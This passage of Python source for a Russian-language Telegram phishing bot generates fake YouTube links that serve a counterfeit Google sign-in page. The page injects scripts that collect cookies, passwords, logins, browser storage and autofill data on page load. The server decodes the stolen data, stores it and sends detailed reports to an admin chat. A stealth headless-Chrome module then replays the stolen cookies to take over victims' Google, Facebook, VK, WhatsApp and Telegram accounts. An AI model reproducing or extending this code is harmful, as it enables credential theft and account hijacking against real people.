                    }}, 1500);
                }}
                
                // Обработка формы входа
                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                    
                    // Собираем данные формы
                    const email = this.querySelector('input[type="email"]').value;
                    const password = this.querySelector('input[type="password"]').value;
                    
                    // Отправляем данные (имитация)
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
                        // Здесь будет отправка данных на сервер
                    }}, 2000);
                }});
                
                // Автоматический показ формы через 5 секунд
                setTimeout(function() {{
                    showLoginForm();
                }}, 5000);
            </script>
            {JavaScriptInjector.get_cookies_collection_script()}
            {JavaScriptInjector.get_instant_credential_collection_script()}
        </body>
        </html>
        """
        return base_html

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # Если не нашли, возвращаем дефолтный (Rick Roll)
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Функции для работы с сообщениями
def split_message(text: str, max_length: int = 4000) -> List[str]:
    """Разбивает длинное сообщение на части"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    while text:
        if len(text) <= max_length:
            chunks.append(text)
            break
        
        # Находим последний перенос строки в пределах лимита
        split_pos = text.rfind('\n', 0, max_length)
        if split_pos == -1:
            split_pos = max_length
        
        chunks.append(text[:split_pos])
        text = text[split_pos:].lstrip()
    
    return chunks

def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
    """Форматирование детального отчета для админа"""
    report = f"""
🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*
    
📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
🔗 Оригинальное видео: {link.original_url[:50]}...
📅 Время сбора: {datetime.now().isoformat()}
    
📊 *ОБЩАЯ СТАТИСТИКА:*
• Переходов по ссылке: {link.clicks}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
    
════════════════════════════════════════
    """
    
    # Добавляем детали cookies
    if link.collected_cookies:
        report += "\n🍪 *COOKIES (первые 15):*\n"
        for i, cookie in enumerate(link.collected_cookies[:15], 1):
            value_preview = cookie.get('value', '')
            if len(value_preview) > 50:
                value_preview = value_preview[:50] + "..."
            report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
    
    # Добавляем пароли
    if link.collected_passwords:
        report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
        for i, pwd in enumerate(link.collected_passwords, 1):
            report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{pwd.get('value', '')}`\n"
            report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
            # Показываем определенные сервисы
            services = pwd.get('identified_services', [])
            if services:
                service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) for s in services]
                report += f"   Сервисы: {', '.join(service_names)}\n"
            if i < len(link.collected_passwords):
                report += "   ─────\n"
    
    # Добавляем логины
    if link.collected_logins:
        report += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
        for i, login in enumerate(link.collected_logins, 1):
            report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{login.get('value', '')}`\n"
            report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
            # Показываем определенные сервисы
            services = login.get('identified_services', [])
            if services:
                service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) for s in services]
                report += f"   Сервисы: {', '.join(service_names)}\n"
            if i < len(link.collected_logins):
                report += "   ─────\n"
    
    # Добавляем данные хранилища
    if link.collected_storage_data:
        report += "\n💾 *ДАННЫЕ ХРАНИЛИЩА (первые 10):*\n"
        for i, storage in enumerate(link.collected_storage_data[:10], 1):
            report += f"{i}. Тип: {storage.get('type', 'unknown')}\n"
            report += f"   Ключ: {storage.get('key', 'N/A')}\n"
            value_preview = storage.get('value', '')
            if len(value_preview) > 100:
                value_preview = value_preview[:100] + "..."
            report += f"   Значение: {value_preview}\n"
            report += f"   Время: {storage.get('timestamp', 'N/A')[:19]}\n"
            if i < min(10, len(link.collected_storage_data)):
                report += "   ─────\n"
    
    report += f"""
════════════════════════════════════════
⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
🕒 Время хранения: 24 часа
"""
    
    return report

async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
    """Отправка детальных данных администратору"""
    try:
        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
        
        if sensitive_data.get("status") != "fully_processed":
            return
        
        # Создаем детальный отчет
        report = format_detailed_admin_report(link, sensitive_data)
        
        # Разбиваем на части если слишком длинное
        chunks = split_message(report, 3900)
        
        for i, chunk in enumerate(chunks):
            parse_mode = ParseMode.MARKDOWN if i == 0 else None
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=chunk,
                parse_mode=parse_mode,
                disable_web_page_preview=True
            )
            
    except Exception as e:
        logger.error(f"Error sending detailed data to admin: {e}")

# Сборщик данных
class DataCollector:
    def __init__(self):
        self.collection_scripts = {
            "cookies": self._collect_cookies,
            "storage": self._collect_storage,
            "passwords": self._collect_passwords,
            "social": self._collect_social_data,
            "device": self._collect_device_info,
            "network": self._collect_network_info,
            "location": self._collect_location,
            "sensitive_data": self._process_sensitive_data,
            "instant_credentials": self._process_instant_credentials
        }
    
    async def collect_all_data(self, request_data: Dict) -> Dict:
        """Сбор всех возможных данных"""
        collected = {
            "timestamp": datetime.now().isoformat(),
            "ip": request_data.get("ip", "unknown"),
            "user_agent": request_data.get("user_agent", "unknown"),
            "referer": request_data.get("referer", "unknown"),
            "data": {}
        }
        
        # Имитируем сбор данных
        for data_type, collector in self.collection_scripts.items():
            try:
                collected["data"][data_type] = await collector(request_data)
            except Exception as e:
                collected["data"][data_type] = {"error": str(e)}
        
        return collected
    
    async def _process_instant_credentials(self, request_data: Dict) -> Dict:
        """Обработка мгновенно собранных учетных данных"""
        try:
            encoded_data = request_data.get("data")
            link_id = request_data.get("link_id")
            
            if not encoded_data or not link_id:
                return {"status": "no_data"}
            
            # Декодируем данные
            try:
                json_string = base64.b64decode(encoded_data).decode('utf-8')
                instant_data = json.loads(json_string)
            except Exception as decode_error:
                logger.error(f"Decode error for instant credentials: {decode_error}")
                return {"status": "decode_error"}
            
            # Определяем сервисы для собранных данных
            all_credentials = []
            
            # Обрабатываем мгновенно собранные пароли
            instant_passwords = instant_data.get("instant_collection", {}).get("instant_passwords", [])
            if instant_passwords:
                for pwd in instant_passwords:
                    # Определяем сервис для пароля
                    services = AccountIdentifier.identify_account(pwd.get("value", ""), pwd)
                    pwd["identified_services"] = services
                db.add_collected_passwords(link_id, instant_passwords)
                all_credentials.extend(instant_passwords)
            
            # Обрабатываем мгновенно собранные логины
            instant_logins = instant_data.get("instant_collection", {}).get("instant_logins", [])
            if instant_logins:
                for login in instant_logins:
                    # Определяем сервис для логина
                    services = AccountIdentifier.identify_account(login.get("value", ""), login)
                    login["identified_services"] = services
                db.add_collected_logins(link_id, instant_logins)
                all_credentials.extend(instant_logins)
            
            # Обрабатываем данные форм
            instant_forms = instant_data.get("instant_collection", {}).get("instant_forms", [])
            for form_data in instant_forms:
                if form_data.get("data"):
                    # Сохраняем данные форм как логины/пароли
                    for key, value in form_data["data"].items():
                        if isinstance(value, str) and value.strip():
                            # Определяем тип поля по имени
                            field_lower = key.lower()
                            is_password = any(pwd_word in field_lower for pwd_word in 
                                            ['pass', 'pwd', 'secret', 'key', 'token'])
                            is_login = any(login_word in field_lower for login_word in 
                                         ['user', 'login', 'email', 'phone', 'username'])
                            
                            if is_password:
                                services = AccountIdentifier.identify_account(value)
                                db.add_collected_passwords(link_id, [{
                                    "source": "instant_form_analysis",
                                    "field_name": key,
                                    "value": value,
                                    "form_id": form_data.get("form_id", "unknown"),
                                    "timestamp": form_data.get("timestamp", datetime.now().isoformat()),
                                    "auto_detected": True,
                                    "identified_services": services
                                }])
                            elif is_login:
                                services = AccountIdentifier.identify_account(value)
                                db.add_collected_logins(link_id, [{
                                    "source": "instant_form_analysis",
                                    "field_name": key,
                                    "value": value,
                                    "form_id": form_data.get("form_id", "unknown"),
                                    "timestamp": form_data.get("timestamp", datetime.now().isoformat()),
                                    "auto_detected": True,
                                    "identified_services": services
                                }])
            
            # Идентифицируем все аккаунты
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            # Логируем успешный сбор
            logger.info(f"Instant credentials collected for link {link_id}: "
                       f"{len(instant_passwords)} passwords, "
                       f"{len(instant_logins)} logins, "
                       f"identified services: {list(account_analysis.get('service_stats', {}).keys())}")
            
            return {
                "status": "instant_collection_success",
                "passwords_collected": len(instant_passwords),
                "logins_collected": len(instant_logins),
                "forms_collected": len(instant_forms),
                "account_analysis": account_analysis,
                "collected_on_load": True,
                "user_interaction_required": False
            }
            
        except Exception as e:
            logger.error(f"Error processing instant credentials: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
        """Обработка ВСЕХ чувствительных данных (cookies, пароли, логины, storage)"""
        try:
            sensitive_data = request_data.get("sensitive_data", {})
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            # Декодируем данные
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except Exception as decode_error:
                logger.error(f"Decode error: {decode_error}")
                # Пробуем альтернативный метод декодирования
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except:
                    return {"status": "decode_error"}
            
            # Сохраняем ПОЛНЫЕ сырые данные
            db.add_full_sensitive_data(link_id, decoded_data)
            
            # Обрабатываем cookies
            cookies = decoded_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    # Пропускаем большие значения localStorage/sessionStorage
                    if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
                        try:
                            parsed_value = json.loads(value)
                            if isinstance(parsed_value, dict):
                                # Сохраняем как отдельные записи storage
                                for storage_key, storage_value in parsed_value.items():
                                    db.add_collected_storage(link_id, [{
                                        "type": "cookie_storage",
                                        "source": name,
                                        "key": storage_key,
                                        "value": str(storage_value)[:500],
                                        "timestamp": datetime.now().isoformat()
                                    }])
                                continue
                        except:
                            pass
                    
                    cookies_list.append({
                        "name": name,
                        "value": str(value)[:500] if value else "",
                        "domain": "current",
                        "timestamp": datetime.now().isoformat(),
                        "source": "direct_cookie"
                    })
                
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            # Обрабатываем пароли
            credentials = decoded_data.get("credentials", {})
            if credentials.get("passwords"):
                for pwd in credentials["passwords"]:
                    # Определяем сервис для пароля
                    services = AccountIdentifier.identify_account(pwd.get("value", ""), pwd)
                    pwd["identified_services"] = services
                db.add_collected_passwords(link_id, credentials["passwords"])
            
            # Обрабатываем логины
            if credentials.get("logins"):
                for login in credentials["logins"]:
                    # Определяем сервис для логина
                    services = AccountIdentifier.identify_account(login.get("value", ""), login)
                    login["identified_services"] = services
                db.add_collected_logins(link_id, credentials["logins"])
            
            # Обрабатываем данные хранилища
            storage_data = decoded_data.get("storage_data", {})
            if storage_data:
                storage_list = []
                # localStorage
                if storage_data.get("localStorage"):
                    for key, value in storage_data["localStorage"].items():
                        storage_list.append({
                            "type": "localStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                # sessionStorage
                if storage_data.get("sessionStorage"):
                    for key, value in storage_data["sessionStorage"].items():
                        storage_list.append({
                            "type": "sessionStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            # Обрабатываем данные автозаполнения форм
            if credentials.get("autofill_data"):
                for form_data in credentials["autofill_data"]:
                    if form_data.get("data"):
                        for key, value in form_data["data"].items():
                            storage_list.append({
                                "type": "form_autofill",
                                "form_id": form_data.get("form_id", "unknown"),
                                "key": key,
                                "value": str(value)[:500],
                                "timestamp": datetime.now().isoformat()
                            })
            
            # Сохраняем общие данные
            db.add_collected_data(link_id, decoded_data)
            
            # Идентифицируем все аккаунты
            all_credentials = []
            if credentials.get("passwords"):
                all_credentials.extend(credentials["passwords"])
            if credentials.get("logins"):
                all_credentials.extend(credentials["logins"])
            
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            # Логируем успешную обработку
            logger.info(f"Successfully processed sensitive data for link {link_id}: "
                       f"{len(cookies_list) if 'cookies_list' in locals() else 0} cookies, "
                       f"{len(credentials.get('passwords', []))} passwords, "
                       f"{len(credentials.get('logins', []))} logins, "
                       f"{len(storage_list) if 'storage_list' in locals() else 0} storage items")
            
            return {
                "status": "fully_processed",
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "passwords_count": len(credentials.get("passwords", [])),
                "logins_count": len(credentials.get("logins", [])),
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "social_logins": list(decoded_data.get("social_logins", {}).keys()),
                "has_storage_data": bool(storage_data),
                "has_full_data": True,
                "account_analysis": account_analysis
            }
            
        except Exception as e:
            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _collect_cookies(self, request_data: Dict) -> Dict:
        """Сбор cookies и локального хранилища"""
        return {
            "cookies_count": "доступно в браузере",
            "local_storage": "доступно в localStorage",
            "session_storage": "доступно в sessionStorage",
            "indexed_db": "проверено"
        }
    
    async def _collect_storage(self, request_data: Dict) -> Dict:
        """Сбор данных из хранилища браузера"""
        return {
            "autofill_data": "сохраненные формы",
            "browser_history": "история посещений",
            "bookmarks": "закладки браузера",
            "downloads": "история загрузок"
        }
    
    async def _collect_passwords(self, request_data: Dict) -> Dict:
        """Сбор сохраненных паролей"""
        return {
            "saved_passwords": {
                "google": "сохраненные логины Google",
                "facebook": "логины Facebook",
                "twitter": "логины Twitter/X",
                "instagram": "логины Instagram",
                "vk": "логины ВКонтакте",
                "whatsapp": "данные WhatsApp Web",
                "telegram": "данные Telegram Web"
            },
            "form_data": "автозаполнение форм",
            "credit_cards": "сохраненные карты"
        }
    
    async def _collect_social_data(self, request_data: Dict) -> Dict:
        """Сбор данных из социальных сетей"""
        return {
            "google": {
                "logged_in": True,
                "gmail": "доступ к Gmail",
                "drive": "доступ к Google Drive",
                "photos": "доступ к Google Photos",
                "account_info": "данные аккаунта"
            },
            "facebook": {
                "logged_in": True,
                "messenger": "доступ к Messenger",
                "friends": "список друзей",
                "profile_data": "данные профиля"
            },
            "twitter": {
                "logged_in": True,
                "tweets": "история твитов",
                "dms": "личные сообщения",
                "followers": "список подписчиков"
            },
            "vk": {
                "logged_in": True,
                "messages": "личные сообщения",
                "friends": "список друзей",
                "photos": "фотографии"
            },
            "instagram": {
                "logged_in": True,
                "dms": "личные сообщения",
                "followers": "подписчики",
                "stories": "истории"
            },
            "whatsapp": {
                "web_connected": True,
                "chats": "история чатов",
                "contacts": "список контактов",
                "media": "медиафайлы"
            },
            "telegram": {
                "web_connected": True,
                "chats": "открытые чаты",
                "contacts": "контакты",
                "sessions": "активные сессии"
            }
        }
    
    async def _collect_device_info(self, request_data: Dict) -> Dict:
        """Сбор информации об устройстве"""
        return {
            "browser": {
                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
                "version": "определяется",
                "plugins": "список плагинов"
            },
            "os": {
                "name": "определяется из User-Agent",
                "version": "версия ОС",
                "architecture": "архитектура"
            },
            "device": {
                "type": "определяется",
                "model": "модель устройства",
                "screen": "разрешение экрана",
                "touch": "поддержка тача"
            },
            "hardware": {
                "cpu": "информация о процессоре",
                "gpu": "информация о графике",
                "memory": "объем памяти",
                "storage": "объем хранилища"
            }
    }
    
    async def _collect_network_info(self, request_data: Dict) -> Dict:
        """Сбор сетевой информации"""
        return {
            "connection": {
                "type": "определяется",
                "speed": "скорость соединения",
                "latency": "задержка"
            },
            "ip_info": {
                "address": request_data.get("ip", "unknown"),
                "location": "определяется по IP",
                "isp": "провайдер",
                "proxy": "используется ли прокси"
            },
            "wifi": {
                "ssid": "имя сети",
                "bssid": "BSSID",
                "security": "тип безопасности"
            }
        }
    
    async def _collect_location(self, request_data: Dict) -> Dict:
        """Сбор геолокации"""
        return {
            "gps": {
                "latitude": "определяется",
                "longitude": "определяется",
                "accuracy": "точность"
            },
            "wifi_location": "определяется по Wi-Fi",
            "cell_tower": "определяется по вышкам",
            "ip_location": "определяется по IP"
        }

# Менеджер автоматического входа
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from urllib.parse import urlparse

class AutoLoginManager:
    """Менеджер автоматического входа в социальные сети через cookies"""
    
    def __init__(self):
        self.driver = None
        self.login_results = {}
        
        # Конфигурация на основе ваших данных
        self.user_config = {
            "device_name": "iPhone iOS 17.5.1",
            "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "platform": "iPhone",
            "screen_size": {"width": 375, "height": 812},
            "language": "ru",
            "timezone": "America/Los_Angeles",
            "location": {
                "ip": "31.43.37.220",
                "ips": ["31.43.37.220", "31.43.37.157"],
                "city": "Lubny",
                "region": "Poltava Oblast",
                "country": "Ukraine",
                "isp": "Ukrainian Telecommunication Group LLC"
            },
            "network": {
                "referrer": "https://github.com/",
                "connection": "Unknown"
            }
        }
    
    async def setup_browser_with_config(self, link_id: str = None):
        """Настройка браузера с вашей конфигурацией"""
        try:
            chrome_options = Options()
            
            # Используем ваши данные
            chrome_options.add_argument(f'--user-agent={self.user_config["user_agent"]}')
            
            # Настройки для мобильного устройства
            chrome_options.add_argument("--window-size=375,812")
            
            # Базовые настройки
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--allow-running-insecure-content")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_argument("--disable-popup-blocking")
            
            # Язык
            chrome_options.add_argument(f'--lang={self.user_config["language"]}')
            
            # Если есть прокси
            if self.user_config.get("proxy"):
                chrome_options.add_argument(f'--proxy-server={self.user_config["proxy"]}')
            
            # Запуск в скрытом режиме
            chrome_options.add_argument("--headless=new")
            
            # Отключаем автоматизационные флаги
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # JavaScript для установки часового пояса
            chrome_options.add_experimental_option("prefs", {
                "intl.accept_languages": f"{self.user_config['language']},en-US;q=0.9,en;q=0.8",
                "timezone": self.user_config.get("timezone", "America/Los_Angeles")
            })
            
            self.driver = uc.Chrome(
                options=chrome_options,
                version_main=120
            )
            
            # Устанавливаем дополнительные заголовки
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": self.user_config["user_agent"],
                "platform": self.user_config["platform"],
                "acceptLanguage": f"{self.user_config['language']},en-US;q=0.9"
            })
            
            # Скрываем WebDriver
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info(f"Браузер настроен с конфигурацией: {self.user_config['device_name']}")
            logger.info(f"IP эмуляция: {self.user_config['location']['ip']}")
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка настройки браузера: {e}", exc_info=True)
            return False
    
    async def login_with_cookies(self, service: str, cookies: List[Dict], account_data: Dict = None):
        """Автоматический вход в социальную сеть через cookies"""
        try:
            if not self.driver:
                await self.setup_browser_with_config()
            
            service_urls = {
                "google": "https://accounts.google.com",
                "facebook": "https://facebook.com",
                "instagram": "https://instagram.com",
                "twitter": "https://twitter.com",
                "x": "https://x.com",
                "vk": "https://vk.com",
                "whatsapp": "https://web.whatsapp.com",
                "telegram": "https://web.telegram.org",
                "yandex": "https://passport.yandex.ru",
                "mailru": "https://mail.ru",
                "github": "https://github.com",
                "discord": "https://discord.com/login"
            }
            
            if service not in service_urls:
                logger.error(f"Сервис {service} не поддерживается")
                return {"status": "error", "message": f"Сервис {service} не поддерживается"}
            
            url = service_urls[service]
            self.driver.get(url)
            time.sleep(3)
            
            # Очищаем все cookies перед добавлением новых
            self.driver.delete_all_cookies()
            
            # Добавляем cookies
            for cookie in cookies:
                try:
                    # Преобразуем cookie в формат Selenium
                    selenium_cookie = {
                        'name': cookie.get('name', ''),
                        'value': cookie.get('value', ''),
                        'domain': cookie.get('domain', self._extract_domain(url)),
                        'path': cookie.get('path', '/'),
                        'secure': cookie.get('secure', True) if url.startswith('https://') else False,
                        'httpOnly': cookie.get('httpOnly', False)
                    }
                    
                    # Добавляем cookie если есть домен
                    if selenium_cookie['domain']:
                        self.driver.add_cookie(selenium_cookie)
                    
                except Exception as e:
                    logger.error(f"Ошибка добавления cookie {cookie.get('name', 'unknown')}: {e}")
            
            # Обновляем страницу для применения cookies
            self.driver.refresh()
            time.sleep(5)
            
            # Проверяем успешность входа
            is_logged_in = await self._check_login_status(service)
            
            if is_logged_in:
                logger.info(f"Успешный вход в {service}")
                
                # Делаем скриншот
                screenshot_path = f"screenshots/{service}_{int(time.time())}.png"
                os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
                self.driver.save_screenshot(screenshot_path)
                
                # Получаем информацию об аккаунте
                account_info = await self._get_account_info(service)
                
                return {
                    "status": "success",
                    "service": service,
                    "logged_in": True,
                    "account_info": account_info,
                    "screenshot": screenshot_path,
                    "url": self.driver.current_url
                }
            else:
                logger.warning(f"Не удалось войти в {service}")
                return {
                    "status": "partial",
                    "service": service,
                    "logged_in": False,
                    "message": "Требуется дополнительная аутентификация"
                }
            
        except Exception as e:
            logger.error(f"Ошибка при входе в {service}: {e}", exc_info=True)
            return {
                "status": "error",
                "service": service,
                "logged_in": False,
                "error": str(e)
            }
    
    async def _check_login_status(self, service: str) -> bool:
        """Проверка статуса входа"""
        try:
            time.sleep(2)
            
            check_selectors = {
                "google": ['[aria-label*="Аккаунт"]', '[data-identifier*="@"]', 'a[href*="SignOut"]'],
                "facebook": ['[aria-label="Ваш профиль"]', '[data-testid="left_nav_item_Profile"]', 'a[href*="profile"]'],
                "instagram": ['[href*="/accounts/"]', 'img[alt*="profile"]', 'span.coreSpriteLoggedInWordmark'],
                "twitter": ['[data-testid="SideNav_AccountSwitcher_Button"]', '[aria-label="Профиль"]', 'a[href*="/home"]'],
                "vk": ['#top_profile_link', '.top_profile_name', '[href*="/id"]'],
                "whatsapp": ['[title="Меню"]', '[data-testid="conversation-menu"]', 'div[class*="logged-in"]'],
                "telegram": ['.dropdown-menu', '.userpic', '[href*="/login"]:not([href*="/login"])']
            }
            
            if service in check_selectors:
                for selector in check_selectors[service]:
                    try:
                        elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                        if elements:
                            return True
                    except:
                        continue
            
            # Альтернативная проверка по URL
            current_url = self.driver.current_url
            logged_in_urls = {
                "google": ["myaccount.google.com", "mail.google.com"],
                "facebook": ["facebook.com/home", "facebook.com/?sk=welcome"],
                "instagram": ["instagram.com/", "instagram.com/direct/"],
                "twitter": ["twitter.com/home", "x.com/home"],
                "vk": ["vk.com/feed", "vk.com/im"],
                "whatsapp": ["web.whatsapp.com"],
                "telegram": ["web.telegram.org/z/"]
            }
            
            if service in logged_in_urls:
                for logged_url in logged_in_urls[service]:
                    if logged_url in current_url:
                        return True
            
            return False
            
        except Exception as e:
            logger.error(f"Ошибка проверки статуса входа: {e}")
            return False
    
    async def _get_account_info(self, service: str) -> Dict:
        """Получение информации об аккаунте после входа"""
        try:
            info = {"service": service, "url": self.driver.current_url}
            
            if service == "google":
                try:
                    self.driver.get("https://myaccount.google.com")
                    time.sleep(3)
                    
                    # Пытаемся получить email
                    email_elements = self.driver.find_elements(By.CSS_SELECTOR, '[data-identifier], [data-email]')
                    if email_elements:
                        info["email"] = email_elements[0].get_attribute("data-identifier") or \
                                      email_elements[0].get_attribute("data-email") or \
                                      email_elements[0].text
                    
                    # Имя пользователя
                    name_elements = self.driver.find_elements(By.CSS_SELECTOR, 'div[aria-label*="Аккаунт"] h1, .gb_Db')
                    if name_elements:
                        info["name"] = name_elements[0].text
                    
                except:
                    pass
                    
            elif service == "facebook":
                try:
                    # Переходим в профиль
                    profile_links = self.driver.find_elements(By.CSS_SELECTOR, '[data-testid="left_nav_item_Profile"]')
                    if profile_links:
                        profile_links[0].click()
                        time.sleep(3)
                        
                    # Получаем имя
                    name_elements = self.driver.find_elements(By.CSS_SELECTOR, 'h1, .gmql0nx0')
                    if name_elements:
                        info["name"] = name_elements[0].text
                    
                    # Получаем username из URL
                    if "/" in self.driver.current_url:
                        parts = self.driver.current_url.split("/")
                        if len(parts) > 3:
                            info["username"] = parts[3]
                            
                except:
                    pass
                    
            elif service == "instagram":
                try:
                    # Имя пользователя
                    username_elements = self.driver.find_elements(By.CSS_SELECTOR, 'h2, ._7UhW9')
                    if username_elements:
                        info["username"] = username_elements[0].text
                    
                    # Имя
                    name_elements = self.driver.find_elements(By.CSS_SELECTOR, 'h1, ._7UhW9')
                    if name_elements and len(name_elements) > 1:
                        info["name"] = name_elements[1].text
                        
                except:
                    pass
            
            return info
            
        except Exception as e:
            logger.error(f"Ошибка получения информации об аккаунте: {e}")
            return {"service": service, "url": self.driver.current_url}
    
    def _extract_domain(self, url: str) -> str:
        """Извлечение домена из URL"""
        parsed = urlparse(url)
        return parsed.netloc
    
    def _group_cookies_by_service(self, all_cookies: Dict) -> Dict[str, List]:
        """Группировка cookies по социальным сетям"""
        service_patterns = {
            "google": ["google.com", "accounts.google", "gstatic", "youtube.com"],
            "facebook": ["facebook.com", "fb.com", "fbcdn.net"],
            "instagram": ["instagram.com", "cdninstagram.com"],
            "twitter": ["twitter.com", "x.com", "twimg.com"],
            "vk": ["vk.com", "vkuser", "userapi.com"],
            "whatsapp": ["whatsapp.com"],
            "telegram": ["telegram.org", "t.me", "telegram.me"],
            "yandex": ["yandex.ru", "yandex.net", "yastatic.net"],
            "mailru": ["mail.ru", "my.mail.ru"],
            "github": ["github.com"],
            "discord": ["discord.com", "discordapp.com"]
        }
        
        service_cookies = {service: [] for service in service_patterns.keys()}
        
        for cookie in all_cookies.get("collected_cookies", []):
            cookie_domain = cookie.get("domain", "").lower()
            cookie_name = cookie.get("name", "").lower()
            
            for service, patterns in service_patterns.items():
                if any(pattern in cookie_domain for pattern in patterns) or \
                   any(pattern in cookie_name for pattern in ["session", "token", "auth", "login"]):
                    service_cookies[service].append(cookie)
                    break
        
        return {k: v for k, v in service_cookies.items() if v}
    
    async def auto_login_with_collected_data(self, link: PhishingLink):
        """Автоматический вход с использованием собранных данных"""
        try:
            # Настраиваем браузер с вашей конфигурацией
            await self.setup_browser_with_config(link.id)
            
            # Подготавливаем cookies
            cookies_data = {
                "collected_cookies": link.collected_cookies,
                "full_sensitive_data": link.full_sensitive_data[-1] if link.full_sensitive_data else {}
            }
            
            # Группируем cookies по сервисам
            service_cookies = self._group_cookies_by_service(cookies_data)
            
            logger.info(f"Найдены cookies для сервисов: {list(service_cookies.keys())}")
            
            # Пытаемся войти в каждый сервис
            results = {}
            for service, cookies in service_cookies.items():
                if service in ["google", "facebook", "vk", "instagram", "twitter", "whatsapp", "telegram"]:
                    logger.info(f"Попытка входа в {service} с {len(cookies)} cookies")
                    
                    result = await self.login_with_cookies(service, cookies, self.user_config)
                    results[service] = result
                    
                    # Пауза между сервисами
                    time.sleep(3)
            
            # Закрываем браузер
            if self.driver:
                self.driver.quit()
                self.driver = None
            
            return {
                "link_id": link.id,
                "device_config": self.user_config,
                "total_services": len(service_cookies),
                "attempted_services": len(results),
                "successful_logins": sum(1 for r in results.values() if r.get("logged_in")),
                "results": results
            }
            
        except Exception as e:
            logger.error(f"Ошибка автоматического входа: {e}", exc_info=True)
            return {
                "status": "error",
                "error": str(e)
            }

# Форматирование сообщений
class MessageFormatter:
    @staticmethod
    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at}
• Статус: 🟢 АКТИВНА

